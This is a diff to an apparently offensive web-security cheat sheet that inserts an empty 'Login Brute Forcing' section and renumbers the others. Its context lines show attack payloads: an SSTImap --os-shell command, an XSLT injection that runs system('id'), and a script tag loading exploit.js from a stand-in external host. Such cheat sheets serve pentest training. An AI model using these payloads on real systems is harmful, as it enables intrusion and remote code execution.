@@ -18,10 +18,11 @@ Overview
 14. - [Server-Side Template Injection (SSTI)](#14---server-side-template-injection-ssti)
 15. - [Server-Side Includes (SSI) Injection](#15---server-side-includes-ssi-injection)
 16. - [eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection](#16---extensible-stylesheet-language-transformations-xslt-server-side-injection)
-17. - [Sensitive Data Exposure](#17---sensitive-data-exposure)
-18. - [HTML Injection](#18---html-injection)
-19. - [Cross-Site Request Forgery (CSRF)](#19---cross-site-request-forgery-csrf)
-20. - [Exploit Research](#20---exploit-research)
+17. - [Login Brute Forcing](#17---login-brute-forcing)
+18. - [Sensitive Data Exposure](#18---sensitive-data-exposure)
+19. - [HTML Injection](#19---html-injection)
+20. - [Cross-Site Request Forgery (CSRF)](#20---cross-site-request-forgery-csrf)
+21. - [Exploit Research](#21---exploit-research)
 
    
 #1. - Web Requests
@@ -1049,7 +1050,10 @@ $ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 <xsl:value-of select="php:function('system','id')" />
 ```
 
-#17. - Sensitive Data Exposure
+#17. - Login Brute Forcing
+-----------------------------------------
+
+#18. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -1060,7 +1064,7 @@ OR
 CTRL + U
 ```
 
-#18. - HTML Injection
+#19. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -1070,7 +1074,7 @@ CTRL + U
 ```
 
 
-#19. - Cross-Site Request Forgery (CSRF)
+#20. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -1079,7 +1083,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#20. - Exploit Research
+#21. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
